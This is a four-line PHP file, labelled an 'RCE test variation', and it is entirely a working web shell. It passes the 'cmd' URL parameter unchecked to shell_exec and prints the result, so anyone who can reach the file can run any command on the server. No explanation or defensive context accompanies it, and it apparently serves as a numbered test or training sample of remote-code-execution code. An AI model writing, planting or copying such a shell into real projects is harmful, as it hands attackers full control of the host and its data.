<?php
// RCE test variation #1214
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>